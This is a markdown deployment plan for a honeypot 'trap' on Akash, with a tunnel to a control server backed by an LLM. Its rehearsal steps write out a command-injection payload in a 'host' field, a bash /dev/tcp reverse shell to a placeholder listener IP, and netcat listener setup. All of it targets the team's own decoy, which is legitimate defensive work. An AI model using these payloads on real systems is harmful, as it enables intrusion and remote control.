# Akash plan (workstream F)

**Goal:** the trap runs on Akash at a public URI. The attacker laptop exploits it, and the reverse shell lands in the attacker's `nc` listener. Every command reaches the control server (shell brain → Guild/Claude, ClickHouse) through an HTTPS tunnel.

## Status (as of the `4ae8cf4` merge)

| Piece | State |
|---|---|
| Console API scripts: `scripts/deploy-hello.sh`, `scripts/close-deployment.sh` | Done (need `akash_key` in `.env`) |
| Hello-world SDL (`deploy/hello-world.yaml`, `uact` bid) | Done. Whether it was actually deployed isn't recorded anywhere yet. |
| Trap SDL (`deploy/akash.yaml`) | Template only: placeholders, missing env vars |
| Image build (`scripts/build-trap.sh`, `Dockerfile.trap`) | **Two blockers, see below** |
| HTTPS tunnel to the control server | Not started |
| Public listener for the attacker's reverse shell | Not started. **The laptop alone won't work, see below** |
| `deploy/RUNBOOK.md` (DSEQ, URI, digest, run sheet) | Not started |

## Blockers to fix first

1. **The image crashes on start.** `apps/trap/server.mjs` imports `./shell-connector.mjs`, but `Dockerfile.trap` only copies `server.mjs`, `public/` and `response-map.json`. Add:
   ```dockerfile
   COPY --chown=node:node apps/trap/shell-connector.mjs ./shell-connector.mjs
   ```
   Test: `docker run --rm -p 3000:3000 <image>` then `curl localhost:3000/health`.
2. **Wrong CPU architecture.** These Macs are Apple Silicon (arm64) and Akash providers run amd64, so a plain `docker build` makes an image providers can't run. Build with:
   ```sh
   docker buildx build --platform linux/amd64 -f Dockerfile.trap -t ghcr.io/<you>/honeystack-trap:demo-1 --push .
   ```
   Then update `scripts/build-trap.sh` to match.

Both changes are in workstream A/F files. They're one line each.

## Architecture on demo day

```
ATTACKER LAPTOP ──curl──> AKASH: trap (public URI, port 80 -> 3000)
                                 │  /v1/shell/* , /v1/events/batch   (Bearer INGEST_TOKEN)
                                 v
               HTTPS tunnel (cloudflared) -> LAPTOP: control server :8080
                                                ├─ shell brain -> Guild honeystack-shell / Claude
                                                ├─ ClickHouse (events, shell_turns)
                                                └─ dashboard + /v1/analyze (CONTROL_TOKEN)
AKASH trap ──TCP reverse shell──> PUBLIC LISTENER (attacker's nc)   <- must be reachable from the internet
```

## Steps

### 1. Prove the account (10 min, Akash owner)
- [ ] Put `akash_key=<Console API key>` in `.env`. It's gitignored and only the Akash owner needs it.
- [ ] `sh scripts/deploy-hello.sh`. Expect a DSEQ, a bid in `uact`, and a service URI that serves the nginx page.
- [ ] Record the DSEQ, URI, and the bid price you accepted in `deploy/RUNBOOK.md`.
- [ ] `sh scripts/close-deployment.sh <DSEQ>`.

### 2. Build and push the trap image (15 min)
- [ ] Fix both blockers above.
- [ ] Make a **public** GHCR package (Akash providers pull anonymously): `docker login ghcr.io`, then push with the buildx command above.
- [ ] Record the digest with `docker buildx imagetools inspect ghcr.io/<you>/honeystack-trap:demo-1`. Use `image@sha256:...` in the SDL.

### 3. Expose the control server (15 min, whoever runs the control server)
- [ ] `brew install cloudflared`
- [ ] Start the control server **with auth on**, because the tunnel is public:
  ```sh
  NODE_ENV=production INGEST_TOKEN=<random> CONTROL_TOKEN=<random> npm run dev:control
  ```
  With `NODE_ENV=production`, `/v1/shell/*` and `/v1/analyze` refuse every request if their token isn't set. Without it they're open in dev mode. Generate tokens with `openssl rand -hex 24`.
- [ ] `cloudflared tunnel --url http://localhost:8080` gives you an `https://<random>.trycloudflare.com` URL. That's `CONTROL_URL`.
- [ ] Check from another network: `curl https://<tunnel>/health` returns `{"ok":true,...}`, and `POST /v1/shell/open` without the token returns `401`.
- Quick tunnels change URL on every restart. For a stable URL, use a named tunnel on a team domain, or update the SDL env and redeploy.

### 4. Give the attacker a public listener (15 min). Pick one.
The trap opens a real TCP connection to the IPv4 address and port in the payload. A laptop on venue Wi-Fi or a phone hotspot is behind NAT and can't accept it.

| Option | How | Notes |
|---|---|---|
| **A. ngrok TCP (recommended)** | `brew install ngrok`, `ngrok config add-authtoken ...`, run `nc -lvnp 4444` and `ngrok tcp 4444`. Ngrok gives `X.tcp.ngrok.io:NNNNN`. | The trap only parses **IPv4**, so resolve the host (`dig +short X.tcp.ngrok.io`) and use `bash -i >& /dev/tcp/<that IP>/NNNNN 0>&1`. Allowlist that IP. ngrok TCP needs a verified (card) account. |
| B. Small VPS | $4–6 droplet/Lightsail; `ssh` in and run `nc -lvnp 4444` | Most reliable. Static IP, easy to allowlist. |
| C. Attacker box on Akash | Second deployment: `alpine` + `netcat-openbsd`, `sleep infinity`, expose 4444 globally; open the Console **Shell** tab and run `nc -lvnp 4444` | Fully on Akash (good sponsor story). The external port is the provider's mapped port, so read it from the lease status. Allowlist the provider's IP. |

### 5. Deploy the trap (15 min)
Update `deploy/akash.yaml` (keep secrets out of git: fill `INGEST_TOKEN` in the Console's SDL editor, not in the committed file):

```yaml
services:
  trap:
    image: ghcr.io/<you>/honeystack-trap@sha256:<digest>
    env:
      - NODE_ENV=production
      - PORT=3000
      - TRAP_INSTANCE_ID=demo-1
      - CONTROL_URL=https://<tunnel>.trycloudflare.com      # trap uses this for /v1/shell/* and /v1/events/batch
      - INGEST_TOKEN=<set in Console only>
      - CALLBACK_ALLOWLIST=<listener IPv4 from step 4>
      - REVSHELL_HOLD_MS=30000
      - DEMO_MODE=false
profiles:
  placement:
    demo:
      pricing:
        trap:
          denom: uact          # as validated by the hello-world deploy
          amount: 1000
```
- [ ] Deploy with the Console (paste the SDL, review the bid, accept) or adapt `deploy-hello.sh` to read `deploy/akash.yaml`. Note that its URI lookup reads `.services.web`, so change it to `.services.trap`.
- [ ] Record the DSEQ, service URI and image digest in `deploy/RUNBOOK.md`.
- [ ] `TARGET=http://<akash-uri> sh scripts/smoke.sh`: `/health` returns OK, and the events show up on the control server (`data/events.jsonl` or ClickHouse).

### 6. End-to-end rehearsal from the attacker laptop (15 min)
```sh
T=http://<akash-uri>
curl -s $T/api/env                                   # leaks ADMIN_TOKEN
TOKEN=synthetic_token_not_valid_anywhere
curl -s -X POST $T/api/admin/diagnostics -H "authorization: Bearer $TOKEN" \
     -H 'content-type: application/json' -d '{"host":"8.8.8.8; id"}'
# listener running (step 4), then:
curl -s -X POST $T/api/admin/diagnostics -H "authorization: Bearer $TOKEN" \
     -H 'content-type: application/json' \
     -d "{\"host\":\"x; bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<PORT> 0>&1'\"}"
```
- [ ] The listener prints `connection received`, the bash banner and a `node@acme-status-7f9c4:/app$` prompt.
- [ ] Commands get answers; `served_by` shows `fast_path` and `guild` (or `llm`) in ClickHouse.
- [ ] `npm run analyze -- <session_id>` returns a Guild summary for that session.
- [ ] The rehearser hasn't read `packages/shell/world.json`. Every "that looks fake" moment goes to the shell-brain owner.
- [ ] Record a backup run (`asciinema rec`), labeled as a recording.

### 7. After the demo (§12.3)
- [ ] `sh scripts/close-deployment.sh <DSEQ>` for the trap (and the attacker box, if you used option C). Confirm the state is closed.
- [ ] Rotate `INGEST_TOKEN` and `CONTROL_TOKEN`, stop `cloudflared` and ngrok, revoke the Guild trigger keys and the Anthropic key if they were shared.
- [ ] Note the remaining balance in `deploy/RUNBOOK.md`.

## Ownership
| Task | Who |
|---|---|
| Steps 1, 2, 4, 5, 7 + RUNBOOK | Akash owner (F) |
| Dockerfile one-line fix | Trap owner (A) or F |
| Step 3 tunnel + control server | Whoever's laptop runs the control server (B/E) |
| Step 6 rehearsal | F as the attacker; everyone watches the dashboard |

## Open questions
- Was the hello-world deploy already run? If so, record the DSEQ/URI and confirm the lease was closed.
- Which listener option (A/B/C)? Option A needs a verified ngrok account.
- Do we want the control server on Akash too (a second service in the same SDL, reached by service name, so no tunnel)? It's simpler networking and a bigger Akash story, but the LLM, Guild and ClickHouse secrets would then live on a third-party provider. The current recommendation is no.
